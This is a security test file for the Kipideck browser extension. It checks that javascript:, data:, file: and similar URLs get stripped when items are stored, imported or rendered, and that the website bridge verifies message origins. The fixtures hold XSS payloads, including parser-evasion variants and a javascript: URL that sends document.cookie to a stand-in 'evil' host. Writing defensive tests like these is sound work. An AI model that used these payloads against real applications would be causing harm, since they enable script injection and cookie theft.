// test/security.test.js — the URL-safety gate and the website-bridge origin
// (QA/security pass, 2026-09-12).
//
// The class of bug these pin down: Kipideck stores URLs from UNTRUSTED places
// (a right-clicked link on a hostile page, a JSON backup somebody else
// generated, an import file, a sync bucket an older client wrote) and later
// renders them as CLICKABLE links on extension pages — where an executable
// scheme like `javascript:` would run with the extension's own permissions,
// not the page's. The fix is one allow-list at the one door every write passes
// through (db.js sanitizeUrls → canon.js isSafeWebUrl), plus render-side gates
// for records written before the door existed.
//
// The second test group guards the website bridge: it lives in a content
// script that runs on EVERY page, so without an origin check any site could
// fingerprint installs, read the library count, learn the exact extension
// version, or summon tabs.

import { test, describe, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { join, dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";

const repoRoot = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const read = (rel) => readFileSync(join(repoRoot, rel), "utf8");

await import("./harness.js");
const { resetWorld } = await import("./harness.js");
const db = await import("../lib/db.js");
const { isSafeWebUrl, safeWebUrl, isSafeImageUrl } = await import("../lib/canon.js");
const { Storage } = await import("../lib/storage.js");

// ---------------------------------------------------------------------------
// The allow-list itself
// ---------------------------------------------------------------------------

describe("canon: isSafeWebUrl / safeWebUrl", () => {
  test("http(s) passes", () => {
    for (const u of [
      "https://example.com/article?x=1#frag",
      "http://localhost:3000/deck",
      "https://user:pass@example.com/p",
      "https://examplexn--i41h.example/x", // IDN
    ]) {
      assert.ok(isSafeWebUrl(u), `expected safe: ${u}`);
      assert.equal(safeWebUrl(u), u.trim());
    }
  });

  test("every executable scheme is refused — including the parser tricks", () => {
    const hostile = [
      "javascript:alert(1)",
      " JaVaScRiPt:alert(1)",
      "javascript://x/%0aalert(1)", // `javascript://` reads like http://
      "java\tscript:alert(1)", // raw tab: URL() would strip it and ACCEPT
      "java\nscript:alert(document.domain)",
      "vbscript:msgbox(1)",
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg",
      "blob:chrome-extension://abc/def",
      "file:///C:/Windows/System32/calc.exe",
      "chrome://settings",
      "chrome-extension://otherid/page.html",
      "about:blank",
      "view-source:https://example.com",
      "",
      "   ",
      null,
      undefined,
      42,
      "not a url",
    ];
    for (const u of hostile) {
      assert.ok(!isSafeWebUrl(u), `expected REJECTED: ${JSON.stringify(u)}`);
      assert.equal(safeWebUrl(u), "");
    }
  });

  test("images allow inert data:image URIs, urls never do", () => {
    assert.ok(isSafeImageUrl("data:image/svg+xml;charset=utf-8,%3Csvg%3E"));
    assert.ok(isSafeImageUrl("data:image/png;base64,iVBOR"));
    assert.ok(isSafeImageUrl("https://example.com/a.png"));
    assert.ok(!isSafeImageUrl("data:text/html,<script>alert(1)</script>"));
    assert.ok(!isSafeImageUrl("javascript:alert(1)"));
  });
});

// ---------------------------------------------------------------------------
// The write door: every stored record comes out clean
// ---------------------------------------------------------------------------

describe("db: sanitizeUrls at the write door", () => {
  beforeEach(async () => {
    await resetWorld();
    await Storage.init();
  });

  test("writeItem strips an executable url but keeps the record", async () => {
    const rec = await db.writeItem(
      {
        id: "x1",
        type: "link",
        title: "free iphone!!!",
        url: "javascript:alert(document.title)",
        sourceUrl: "https://evil.example/page",
        image: "data:text/html,<script>bad</script>",
        tags: [],
        deckId: "inbox",
        createdAt: 1,
        updatedAt: 1,
      },
      ""
    );
    assert.equal(rec.url, "", "the clickable payload must not survive the write");
    assert.equal(rec.sourceUrl, "https://evil.example/page");
    assert.equal(rec.image, "", "data:text/html is not an image");
    // The item still exists and stays findable — safety must not cost data.
    assert.equal(rec.title, "free iphone!!!");
    // Dedupe canon is now computed from the (safe) sourceUrl, not the stripped url.
    assert.equal(rec.canon, "evil.example/page");
  });

  test("writeItemsBulk sanitizes too, including session tabs", async () => {
    await db.writeItemsBulk([
      {
        item: {
          id: "s1",
          type: "session",
          title: "window",
          url: "",
          sourceUrl: "",
          deckId: "inbox",
          tags: [],
          createdAt: 1,
          updatedAt: 1,
          tabs: [
            { url: "https://good.example/a", title: "ok" },
            { url: "javascript:alert(1)", title: "bad" },
            { url: "file:///C:/secret.html", title: "snooping" },
          ],
        },
        text: "",
      },
    ]);
    const rec = await db.getItemMeta("s1");
    assert.equal(rec.tabs[0].url, "https://good.example/a");
    assert.equal(rec.tabs[1].url, "");
    assert.equal(rec.tabs[2].url, "");
  });

  test("data:image survives the write door (letter avatars and cached icons)", async () => {
    const rec = await db.writeItem(
      {
        id: "x2",
        type: "image",
        title: "local image",
        url: "https://example.com/p",
        image: "data:image/png;base64,iVBOR",
        deckId: "inbox",
        tags: [],
        createdAt: 1,
        updatedAt: 1,
      },
      ""
    );
    assert.equal(rec.image, "data:image/png;base64,iVBOR");
  });

  test("a malicious Kipideck-JSON restore cannot plant an executable url", async () => {
    const payload = JSON.stringify({
      version: 1,
      app: "kipideck",
      exportedAt: 1,
      items: [
        {
          id: "m1",
          type: "page",
          title: "trojan",
          url: "javascript:fetch('http://evil/' + document.cookie)",
          content: "harmless text",
          deckId: "inbox",
          tags: [],
          createdAt: 2,
          updatedAt: 2,
        },
      ],
    });
    const res = await Storage.importJSON(payload);
    assert.equal(res.written, 1, "the record is kept — its text is the value");
    const rec = await db.getItemMeta("m1");
    assert.equal(rec.url, "");
    assert.equal(rec.title, "trojan");
  });

  test("importRecords (file imports) rejects non-canalisable urls as invalid", async () => {
    const out = await Storage.importRecords([
      { id: "a", type: "link", title: "ok", url: "https://example.com/1" },
      { id: "b", type: "link", title: "evil", url: "javascript:alert(1)" },
      { id: "c", type: "link", title: "tricky", url: "javascript://x/%0aalert(1)" },
    ]);
    assert.equal(out.added, 1);
    assert.equal(out.invalid, 2);
    assert.equal(await db.getItemMeta("b"), null);
    assert.equal(await db.getItemMeta("c"), null);
  });
});

// ---------------------------------------------------------------------------
// Static guards: the doors that cannot be unit-tested in node stay shut
// ---------------------------------------------------------------------------

describe("manifest: attack surface only grows through review", () => {
  const manifest = JSON.parse(read("manifest.json"));

  test("externally_connectable is gone", () => {
    // v1.7 shipped `https://*.vercel.app/*` + `http://localhost:*/*` while no
    // code had an onMessageExternal handler — any Vercel-hosted site (attackers
    // included) could address the extension. The bridge works via the content
    // script's postMessage, so the key is pure liability. If it ever returns,
    // it must name the ONE origin it serves and come with a handler test.
    assert.equal(manifest.externally_connectable, undefined);
  });

  test("host_permissions still list the Google OAuth endpoints explicitly", () => {
    const hosts = manifest.host_permissions || [];
    assert.ok(hosts.includes("https://www.googleapis.com/*"));
    assert.ok(hosts.includes("https://oauth2.googleapis.com/*"));
  });
});

describe("website bridge: origin-gated like a lock, not a doorbell", () => {
  const content = read("content/content.js");

  test("the message listener checks event.origin before doing anything", () => {
    assert.match(content, /function isBridgeOrigin\(origin\)/);
    assert.match(
      content,
      /if \(!isBridgeOrigin\(event\.origin\)\) return;/,
      "the KIPIDECK_* listener must bail out for foreign origins BEFORE parsing the message"
    );
    // Ordering matters: the origin gate has to come before any handler branch.
    const gateAt = content.indexOf("isBridgeOrigin(event.origin)) return");
    const pingAt = content.indexOf('msg.type === "KIPIDECK_PING"');
    assert.ok(gateAt > -1 && pingAt > -1 && gateAt < pingAt, "origin gate must precede KIPIDECK_PING handling");
  });

  test("the allow-list is the marketing site plus loopback only", () => {
    assert.match(content, /"https:\/\/kipideck\.vercel\.app"/);
    assert.match(content, /localhost\|127\\\.0\\\.0\\\.1/);
    // The gate is a fixed allow-list: no wildcard origins inside the function.
    const fn = content.match(/function isBridgeOrigin\(origin\)\s*\{[\s\S]*?\n  \}/);
    assert.ok(fn, "isBridgeOrigin should be a small, readable function");
    assert.ok(!/\*\s*\)\s*;/.test(fn[0]) && !/origin\s*===\s*["']https?\*?\*/.test(fn[0]), "no wildcard origins");
  });
});

describe("library render path: legacy records cannot bypass the door", () => {
  test("anchors and window.open only link safe urls", () => {
    const lib = read("library/library.js");
    assert.match(lib, /function openableUrl\(raw\)/, "library.js must keep the render-side gate");
    // The detail-view anchor goes through it…
    assert.match(lib, /const openable = openableUrl\(it\.url\)/);
    // …and so does "Open source".
    assert.match(lib, /if \(openableUrl\(it\.url\)\) \{/);
  });

  test("the popup's card click is gated too", () => {
    const popup = read("popup/popup.js");
    assert.match(popup, /if \(url && isSafeWebUrl\(url\)\) ext\.tabs\.create/);
  });
});
